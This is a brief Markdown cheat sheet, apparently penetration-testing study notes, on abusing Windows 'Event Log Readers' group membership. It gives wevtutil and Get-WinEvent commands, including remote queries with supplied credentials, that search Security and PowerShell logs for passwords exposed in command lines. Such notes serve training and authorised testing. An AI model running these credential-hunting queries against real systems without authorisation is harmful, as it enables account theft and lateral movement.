# Exploiting Event Log Readers Group for Security Log Access

## Verify Group Membership:
```powershell
net localgroup "Event Log Readers"
```
_Check if the user is a member of the "Event Log Readers" group._

## Identify Audit Settings:
Determine if process creation auditing (Event ID 4688) and command-line logging are enabled.

## Query Security Logs using `wevtutil`:
```powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```
_Search for credential usage in the security logs._

```powershell
wevtutil qe Security /rd:true /f:text /r:<remote_host> /u:<user> /p:<password> | findstr "/user"
```
_Remotely query security logs with credentials._

## Query Security Logs using `Get-WinEvent`:
```powershell
Get-WinEvent -LogName security | Where-Object { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
_Search for credential usage in process creation events._

```powershell
Get-WinEvent -LogName security -Credential <PSCredential> | Where-Object { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
_Remote query using specific credentials._

## Explore PowerShell Operational Logs:
Examine the PowerShell Operational log for sensitive information if script block or module logging is enabled.

## Commands:
- `net localgroup "Event Log Readers"`
- `wevtutil qe Security`
- `findstr`

## PowerShell Cmdlets:
- `Get-WinEvent`
- `Select-String`
- `Where-Object`

## Techniques:
- Leverage "Event Log Readers" group membership to access security logs.
- Search for sensitive information (credentials, command-line parameters) within event logs.
- Use `wevtutil` and `Get-WinEvent` to query and filter event log data.
- Explore PowerShell Operational logs for potential credential leaks.
- Understand the importance of process creation auditing and command-line logging.
